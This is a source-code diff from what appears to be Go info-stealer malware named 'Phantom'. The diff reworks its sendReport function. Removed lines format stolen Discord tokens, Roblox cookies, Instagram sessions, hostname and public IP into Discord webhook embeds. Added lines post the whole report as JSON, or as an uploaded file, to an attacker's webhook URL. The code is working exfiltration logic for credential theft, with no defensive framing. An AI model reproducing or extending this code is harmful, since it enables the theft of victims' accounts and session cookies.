@@ -4,11 +4,11 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"os/exec"
@@ -510,85 +510,43 @@ func formatList(list []string, limit int) string {
 }
 
 func sendReport(report SystemReport) {
-	// Construction de l'interface visuelle via plusieurs embeds
-	embeds := []map[string]interface{}{
-		{
-			"title": "👻 Phantom Payload Executed",
-			"color": 0x2c3e50,
-			"fields": []map[string]interface{}{
-				{"name": "👤 User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
-				{"name": "💻 Hostname", "value": fmt.Sprintf("`%s`", report.Hostname), "inline": true},
-				{"name": "🌐 Public IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
-				{"name": "🖥️ OS", "value": fmt.Sprintf("`%s (%s)`", report.OS, report.Arch), "inline": true},
-				{"name": "⚙️ CPUs", "value": fmt.Sprintf("`%d`", report.CPUs), "inline": true},
-				{"name": "🕒 Generated At", "value": fmt.Sprintf("`%s`", report.Timestamp), "inline": false},
-				{"name": "🌐 Browsers Found", "value": fmt.Sprintf("`%s`", strings.Join(report.Browsers, ", ")), "inline": false},
-			},
-			"footer": map[string]string{"text": "Phantom Generator v1.0 | System Report"},
-		},
+	// Convert full report to JSON
+	jsonData, err := json.MarshalIndent(report, "", "  ")
+	if err != nil {
+		return
 	}
 
-	// Embed pour les Tokens Discord
-	if len(report.DiscordTokens) > 0 {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "📱 Discord Tokens Captured",
-			"color":       0x5865F2,
-			"description": formatList(report.DiscordTokens, 8),
-			"footer":      map[string]string{"text": fmt.Sprintf("Total Tokens: %d", len(report.DiscordTokens))},
-		})
-	} else {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "📱 Discord Tokens",
-			"color":       0xe74c3c,
-			"description": "❌ No Discord tokens found on this system.",
-		})
-	}
-
-	// Embed pour les Cookies Roblox
-	if len(report.RobloxCookies) > 0 {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "🎮 Roblox Cookies Captured",
-			"color":       0xFFFFFF,
-			"description": formatList(report.RobloxCookies, 5),
-			"footer":      map[string]string{"text": fmt.Sprintf("Total Cookies: %d", len(report.RobloxCookies))},
-		})
-	} else {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "🎮 Roblox Cookies",
-			"color":       0xe74c3c,
-			"description": "❌ No Roblox cookies found on this system.",
-		})
-	}
-
-	// Embed pour les Cookies Instagram
-	if len(report.InstaCookies) > 0 {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "📸 Instagram Sessions Captured",
-			"color":       0xE1306C,
-			"description": formatList(report.InstaCookies, 5),
-			"footer":      map[string]string{"text": fmt.Sprintf("Total Potential Sessions: %d", len(report.InstaCookies))},
-		})
-	} else {
-		embeds = append(embeds, map[string]interface{}{
-			"title":       "📸 Instagram Sessions",
-			"color":       0xe74c3c,
-			"description": "❌ No Instagram sessions found on this system.",
-		})
+	// If JSON is too big for a simple message, we send it as a file
+	// Discord message limit is 2000 chars, so we use a buffer
+	if len(jsonData) > 1800 {
+		sendAsFile(jsonData)
+		return
 	}
 
 	payload := map[string]interface{}{
-		"embeds": embeds,
+		"content":  "```json\n" + string(jsonData) + "\n```",
+		"username": "Phantom JSON Logger",
 	}
 
-	jsonData, _ := json.Marshal(payload)
+	body, _ := json.Marshal(payload)
+	http.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
+}
 
-	req, _ := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(jsonData))
-	req.Header.Set("Content-Type", "application/json")
+func sendAsFile(data []byte) {
+	// Simple implementation to send file to Discord Webhook
+	// We use a multipart form-data request
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
 
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
+	part, _ := writer.CreateFormFile("file", "phantom_report.json")
+	part.Write(data)
+
+	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
+	writer.Close()
+
+	req, _ := http.NewRequest("POST", WebhookURL, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{}
 	client.Do(req)
 }
